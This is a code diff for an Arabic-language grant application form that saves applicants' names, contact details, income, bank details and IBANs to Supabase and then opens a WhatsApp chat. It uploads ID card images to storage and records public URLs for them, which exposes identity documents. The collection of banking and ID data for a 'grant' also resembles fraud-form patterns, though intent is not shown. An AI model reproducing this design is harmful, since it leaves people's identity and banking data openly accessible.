@@ -410,6 +410,119 @@ function redirectToWhatsApp() {
     showStep(1);
 }
 
+
+// ================================
+// SUPABASE INTEGRATION
+// ================================
+
+// دالة رفع الملفات إلى Supabase
+async function uploadFileToSupabase(file, fileName) {
+    try {
+        console.log(`📤 جاري رفع الملف: ${fileName}`);
+        
+        const { data, error } = await supabase.storage
+            .from('applications')
+            .upload(fileName, file, { 
+                cacheControl: '3600', 
+                upsert: false 
+            });
+        
+        if (error) throw error;
+        
+        console.log('✅ تم رفع الملف بنجاح');
+        
+        // الحصول على الرابط العام
+        const { data: publicUrlData } = supabase.storage
+            .from('applications')
+            .getPublicUrl(fileName);
+        
+        return publicUrlData.publicUrl;
+        
+    } catch (error) {
+        console.error('❌ خطأ في رفع الملف:', error);
+        throw error;
+    }
+}
+
+// تعديل دالة redirectToWhatsApp - استبدل الدالة الموجودة
+async function redirectToWhatsApp() {
+    const transactionNumber = sessionStorage.getItem('transactionNumber') || 'WA-2026-0000';
+    
+    try {
+        console.log('🚀 جاري حفظ البيانات في Supabase...');
+        
+        // جمع جميع البيانات من جميع الخطوات
+        const applicationData = {
+            full_name: formData.personalInfo.fullName,
+            phone: formData.contactCareer.phone,
+            email: formData.contactCareer.email,
+            country: formData.personalInfo.country,
+            marital_status: formData.personalInfo.maritalStatus,
+            num_children: parseInt(formData.personalInfo.numChildren) || 0,
+            profession: formData.contactCareer.profession,
+            monthly_income: parseInt(formData.contactCareer.income) || 0,
+            grant_type: formData.grantDetails.grantType,
+            grant_amount: parseInt(formData.grantDetails.grantAmount) || 0,
+            grant_description: formData.grantDetails.grantDescription,
+            bank_name: formData.bankingInfo.bankName,
+            account_holder: formData.bankingInfo.accountHolder,
+            iban: formData.bankingInfo.iban.replace(/\s/g, ''),
+            transaction_id: transactionNumber,
+            status: 'pending',
+            created_at: new Date().toISOString()
+        };
+
+        // رفع صورة الهوية الأمامية
+        if (formData.attachments.idCardFront) {
+            const frontFile = formData.attachments.idCardFront;
+            const frontPath = `${transactionNumber}/front_${Date.now()}.${frontFile.name.split('.').pop()}`;
+            applicationData.id_card_front_url = await uploadFileToSupabase(frontFile, frontPath);
+            console.log('✅ تم رفع صورة الهوية الأمامية');
+        }
+
+        // رفع صورة الهوية الخلفية
+        if (formData.attachments.idCardBack) {
+            const backFile = formData.attachments.idCardBack;
+            const backPath = `${transactionNumber}/back_${Date.now()}.${backFile.name.split('.').pop()}`;
+            applicationData.id_card_back_url = await uploadFileToSupabase(backFile, backPath);
+            console.log('✅ تم رفع صورة الهوية الخلفية');
+        }
+
+        // حفظ البيانات في Supabase
+        console.log('💾 جاري حفظ البيانات في قاعدة البيانات...');
+        const { data, error } = await supabase
+            .from('applications')
+            .insert([applicationData]);
+
+        if (error) throw error;
+
+        console.log('✅ تم حفظ جميع البيانات بنجاح في Supabase!');
+
+    } catch (error) {
+        console.error('❌ خطأ في حفظ البيانات:', error.message);
+        // لا نوقف العملية، نستمر في فتح WhatsApp على أي حال
+        console.warn('⚠️ تم تقديم الطلب محلياً، قد تكون هناك مشكلة في قاعدة البيانات');
+    }
+    
+    // فتح WhatsApp بغض النظر عن نجاح Supabase
+    const message = encodeURIComponent(
+        `مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ${transactionNumber}`
+    );
+    
+    window.open(`https://wa.me/966545239928?text=${message}`, '_blank');
+    
+    // إعادة تعيين النموذج
+    document.getElementById('grantForm').reset();
+    sessionStorage.removeItem('transactionNumber');
+    
+    // إغلاق النموذج
+    document.getElementById('successModal').classList.remove('active');
+    
+    // العودة إلى الخطوة الأولى
+    currentStep = 1;
+    updateProgressBar();
+    showStep(1);
+}
 // Setup form field validation on blur
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('input, select, textarea').forEach(field => {
